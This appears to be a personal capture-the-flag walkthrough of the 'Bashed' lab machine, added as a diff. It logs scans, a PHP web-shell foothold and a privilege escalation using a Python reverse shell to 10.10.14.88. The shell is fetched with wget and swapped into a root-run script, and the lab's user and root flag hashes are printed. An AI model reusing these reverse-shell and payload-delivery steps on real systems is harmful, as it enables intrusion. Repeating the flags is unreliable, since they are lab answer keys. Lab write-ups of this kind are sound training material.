@@ -1,0 +1,158 @@
+Machine-Name : Bashed
+IP-Address   : 10.129.37.7
+
+
+Command-Line: sudo nmap -A 10.129.37.7
+Result:
+    Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-09 00:29 EST
+    Nmap scan report for 10.129.37.7
+    Host is up (0.070s latency).
+    Not shown: 999 closed ports
+    PORT   STATE SERVICE VERSION
+    80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+    |_http-server-header: Apache/2.4.18 (Ubuntu)
+    |_http-title: Arrexel's Development Site
+    No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+OS: Based upon httpd version: "Ubuntu xenial (16.04LTS)"
+
+
+Command-Line: ./dirsearch.py -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e php-t 20 -u http://10.129.37.7
+Result:
+    [00:50:44] Starting:
+    [00:50:45] 200 -    2KB - /images/
+    [00:50:45] 301 -  311B  - /images  ->  http://10.129.37.7/images/
+    [00:50:46] 403 -  292B  - /icons/
+    [00:50:47] 301 -  312B  - /uploads  ->  http://10.129.37.7/uploads/
+    [00:50:47] 200 -   14B  - /uploads/
+    [00:50:49] 301 -  308B  - /php  ->  http://10.129.37.7/php/
+    [00:50:49] 200 -  939B  - /php/
+    [00:50:51] 301 -  308B  - /css  ->  http://10.129.37.7/css/
+    [00:50:51] 200 -    2KB - /css/
+    [00:50:54] 301 -  308B  - /dev  ->  http://10.129.37.7/dev/
+    [00:50:54] 200 -    1KB - /dev/
+    [00:50:55] 301 -  307B  - /js  ->  http://10.129.37.7/js/
+    [00:50:55] 200 -    3KB - /js/
+    [00:51:00] 200 -    0B  - /config.php
+    [00:51:12] 301 -  310B  - /fonts  ->  http://10.129.37.7/fonts/
+    [00:51:12] 200 -    2KB - /fonts/
+    [01:09:55] 403 -  299B  - /server-status
+    [01:09:55] 403 -  300B  - /server-status/
+
+    Task Completed
+
+
+
+Command-Line: sudo dirb http://10.129.37.7
+Result:
+    -----------------
+    DIRB v2.22
+    By The Dark Raver
+    -----------------
+
+    START_TIME: Mon Nov  9 00:52:09 2020
+    URL_BASE: http://10.129.37.7/
+    WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+
+    -----------------
+
+    GENERATED WORDS: 4613
+
+    ---- Scanning URL: http://10.129.37.7/ ----
+    ==> DIRECTORY: http://10.129.37.7/css/
+    ==> DIRECTORY: http://10.129.37.7/dev/
+    ==> DIRECTORY: http://10.129.37.7/fonts/
+    ==> DIRECTORY: http://10.129.37.7/images/
+    + http://10.129.37.7/index.html (CODE:200|SIZE:7743)
+    ==> DIRECTORY: http://10.129.37.7/js/
+    ==> DIRECTORY: http://10.129.37.7/php/
+    + http://10.129.37.7/server-status (CODE:403|SIZE:299)
+    ==> DIRECTORY: http://10.129.37.7/uploads/
+
+  Visiting-Path: /dev:
+  Result:
+      Links to click on. phpbash.php
+
+  **Reverse Shell SUCCESSFUL**
+
+  Reverse-Shell: cat /home/arrexel/user.txt
+  Result: 2c281f318555dbc1b856957c7147bfc1
+
+  *** USER OWNED ***
+
+  Attempting root access...
+
+Reverse-Shell: cd /var/www/http/uploads (rwx)
+Result: Successful.
+
+Command-Line: locate php-reverse-shell.php
+Result:
+    /usr/share/laudanum/php/php-reverse-shell.php
+    /usr/share/laudanum/wordpress/templates/php-reverse-shell.php
+    /usr/share/webshells/php/php-reverse-shell.php
+
+Command-Line: cp /usr/share/webshells/php/php-reverse-shell.php ./shell.php
+Result: Changed IP address and port to: 10.10.14.88 8321
+
+Command-Line: nc -nlvp 8321
+Result: Connected.
+
+Reverse-Shell: python -c 'import pty;pty.spawn("/bin/bash");'
+Result: Successful.
+
+Reverse-Shell: stty raw -echo
+Result: Fixed double chars.
+
+Reverse-Shell: sudo -u scriptmanager bash
+Result: whoami: scriptmanager
+
+Reverse-Shell: cd /scripts
+Result: Successful.
+
+Command-Line: touch reverse-shell.py
+Command-Line: nano reverse-shell.py
+Written-To-File:
+    import socket,subprocess,os
+    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+    s.connect(("10.10.14.88",9999))
+    os.dup2(s.fileno(),0)
+    os.dup2(s.fileno(),1)
+    os.dup2(s.fileno(),2)
+    p=subprocess.call(["/bin/sh","-i"])
+
+Command-Line: sudo python3 -m http.server --bind 10.10.14.88 80
+Result: Serving HTTP on 10.10.14.88 port 80 (http://10.10.14.88:80/) ...
+
+Reverse-Shell: wget http://10.10.14.88/reverse-shell.py
+Server-Result: 10.129.37.7 - - [09/Nov/2020 19:45:32] "GET /reverse-shell.py HTTP/1.1" 200 -
+Result:
+    --2020-11-09 16:48:37--  http://10.10.14.88/reverse-shell.py
+    Connecting to 10.10.14.88:80... connected.
+    HTTP request sent, awaiting response... 200 OK
+    Length: 213 [text/plain]
+    Saving to: 'reverse-shell.py'
+
+    reverse-shell.py    100%[===================>]     213  --.-KB/s    in 0s
+
+    2020-11-09 16:48:37 (50.9 MB/s) - 'reverse-shell.py' saved [213/213]
+    **SUCCESSFUL**
+
+Command-Line: nc -nlvp 9999
+Result: listening on [any] 9999 ...
+
+Reverse-Shell: ls
+Result:
+    reverse-shell.py  test.py  test.txt
+Reverse-Shell: mv test.py temp.py
+Reverse-Shell: mv reverse-shell.py test.py
+Reverse-Shell: rm -rf test.txt
+Result:
+"After waiting a little while, a root-shell appeared where the NetCat service was listening on port 9999"
+Reverse-Shell: python -c 'import pty;pty.spawn("/bin/bash");'
+Result:
+  *** ROOT ACCESS SUCCESSFUL ***
+Reverse-Shell: cat /root/root.txt
+Result: cc4f0afe3a1026d402ba10329674a8e2
+
+*** ROOT OWNED ***
+
+*** FINISHED ***
